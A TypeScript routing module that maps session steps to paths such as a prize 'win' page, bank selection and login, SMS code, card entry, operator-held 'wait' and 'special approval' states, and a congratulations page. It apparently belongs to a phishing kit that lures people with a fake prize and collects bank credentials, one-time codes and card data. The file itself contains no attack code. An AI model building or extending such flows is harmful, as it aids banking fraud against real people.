import type { SessionStep } from "@/types/session";

export function stepToPath(
  step: SessionStep,
  sessionId: string,
  routeSessionId: string = sessionId,
): string {
  switch (step) {
    case "code_entry":
      return "/code";
    case "win":
      return `/win/${routeSessionId}`;
    case "banken":
      return "/banken";
    case "bank":
    case "bank_login":
      return "/banken";
    case "wait":
      return "/wait";
    case "invalid_bank":
      return "/invalid-bank";
    case "live_support":
      return "/live-support";
    case "sms":
      return "/sms";
    case "card":
      return "/card";
    case "congrats":
      return "/congratulations";
    case "special_approval":
      return "/wait";
    default:
      return `/win/${routeSessionId}`;
  }
}

export function pathToStep(pathname: string): SessionStep | null {
  if (pathname.startsWith("/code")) return "code_entry";
  if (pathname.includes("/bank/")) return "bank";
  if (pathname.startsWith("/win")) return "win";
  if (pathname.startsWith("/banken") || pathname.startsWith("/banks")) return "banken";
  if (pathname.startsWith("/wait")) return "wait";
  if (pathname.startsWith("/invalid-bank")) return "invalid_bank";
  if (pathname.startsWith("/live-support")) return "live_support";
  if (pathname.startsWith("/congratulations")) return "congrats";
  if (pathname.startsWith("/sms")) return "sms";
  if (pathname.startsWith("/card")) return "card";
  return null;
}
